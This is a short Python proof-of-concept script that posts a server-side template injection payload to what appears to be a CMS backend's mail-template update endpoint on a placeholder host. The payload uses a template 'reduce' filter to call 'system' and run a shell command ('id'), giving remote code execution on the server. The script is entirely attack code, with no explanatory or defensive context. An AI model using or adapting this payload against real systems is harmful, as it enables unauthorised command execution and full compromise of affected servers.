import requests
payload = "{{ ['x']|reduce('system', 'id') }}"
requests.post('https://council.example/backend/system/mailtemplates/update/9',
              data={'MailTemplate[content_html]': payload})
